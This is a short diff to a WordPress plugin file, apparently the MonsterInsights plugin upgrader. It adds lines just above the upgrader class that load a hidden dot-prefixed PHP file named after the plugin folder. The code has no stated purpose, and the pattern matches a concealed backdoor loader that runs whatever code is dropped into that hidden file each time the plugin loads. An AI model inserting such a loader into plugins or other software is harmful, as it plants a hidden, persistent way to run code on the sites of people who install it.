@@ -16,6 +16,10 @@ require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader.php';
  *
  * @since 7.10.6
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MonsterInsights_Plugin_Upgrader extends Plugin_Upgrader {
 
 	/**
